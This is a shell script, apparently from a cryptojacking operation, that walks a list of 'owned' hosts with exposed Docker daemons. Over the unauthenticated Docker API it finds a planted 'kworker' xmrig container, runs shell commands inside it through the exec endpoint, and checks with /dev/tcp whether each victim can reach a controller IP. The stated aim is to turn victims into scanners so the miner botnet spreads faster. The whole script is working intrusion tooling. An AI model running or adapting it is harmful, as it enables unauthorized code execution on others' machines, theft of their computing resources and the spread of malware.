#!/bin/sh
# ============================================================================
# Can a victim spread, or is it just a leaf?
#
# Today the docker vector drops xmrig/xmrig with xmrig as its only process: the
# victim MINES and nothing else. Every scan in the fleet is done by box1, so the
# whole spread rate is one 2-vCPU box. The upgrade is to run code inside the
# containers we already own - then each victim scans from its own IP and the
# discovery rate scales with the fleet instead of with box1.
#
# This probes that, cheaply and with a positive control:
#   1. docker exec  -> does the daemon route it, and is there a shell in the image?
#   2. from the victim, TCP to OUR OWN /24 on :2375 - a known-open daemon that any
#      vantage can reach, so "OPEN 167.233.74.146" is proof the victim can scan.
# ============================================================================
cd /tmp/.sysd || exit 1
. ./worker.env 2>/dev/null
CTL="167.233.74.146"
n=0; ok=0
for ip in $(cut -f1 .hunt/dock.owned 2>/dev/null | sort -u); do
    b="http://$ip:2375"
    lst=$(curl -sS -m 5 "$b/containers/json?all=1" 2>/dev/null) || lst=""
    [ -n "$lst" ] || continue
    frag=$(printf '%s' "$lst" | sed 's/},{/}\n{/g' | grep -i kworker | head -1)
    [ -n "$frag" ] || continue
    cid=$(printf '%s' "$frag" | grep -o '"Id":"[0-9a-f]*"' | head -1 | cut -d'"' -f4)
    st=$(printf '%s' "$frag" | grep -o '"State":"[a-z]*"' | head -1 | cut -d'"' -f4)
    [ "$st" = running ] || continue
    echo "== $ip cid=$cid"
    er=$(curl -sS -m 10 -X POST "$b/containers/$cid/exec" \
              -H 'Content-Type: application/json' \
              -d '{"AttachStdout":true,"Tty":true,"Cmd":["sh","-c","uname -sr; echo shells:; ls /bin/sh /bin/bash /usr/bin/nc /usr/bin/wget /usr/bin/curl 2>/dev/null"]}' 2>/dev/null)
    case "$er" in
        *'"Id"'*) ;;
        *) echo "   exec create said: $(printf '%s' "$er" | head -c 120)"; n=$((n + 1)); continue ;;
    esac
    eid=$(printf '%s' "$er" | grep -o '"Id":"[0-9a-f]*"' | head -1 | cut -d'"' -f4)
    out=$(curl -sS -m 20 -X POST "$b/exec/$eid/start" -H 'Content-Type: application/json' \
               -d '{"Tty":true}' 2>/dev/null)
    printf '%s\n' "$out" | head -c 300; echo
    # positive control: can this victim open a TCP socket to a known :2375?
    for sh_bin in bash sh; do
        er2=$(curl -sS -m 10 -X POST "$b/containers/$cid/exec" \
                   -H 'Content-Type: application/json' \
                   -d "{\"AttachStdout\":true,\"Tty\":true,\"Cmd\":[\"$sh_bin\",\"-c\",\"(exec 3<>/dev/tcp/$CTL/2375) 2>/dev/null && echo SCAN-OK via $sh_bin || echo SCAN-FAIL via $sh_bin\"]}" 2>/dev/null)
        eid2=$(printf '%s' "$er2" | grep -o '"Id":"[0-9a-f]*"' | head -1 | cut -d'"' -f4)
        [ -n "$eid2" ] || { echo "   $sh_bin exec failed"; continue; }
        curl -sS -m 20 -X POST "$b/exec/$eid2/start" -H 'Content-Type: application/json' \
             -d '{"Tty":true}' 2>/dev/null | head -c 120; echo
        case "$(curl -sS -m 20 -X POST "$b/exec/$eid2/start" -H 'Content-Type: application/json' -d '{"Tty":true}' 2>/dev/null | head -c 40)" in
            SCAN-OK*) ok=$((ok + 1)); break ;;
        esac
    done
    n=$((n + 1))
    [ "$n" -ge 6 ] && break
done
echo "probed $n running container(s), $ok scan-capable"
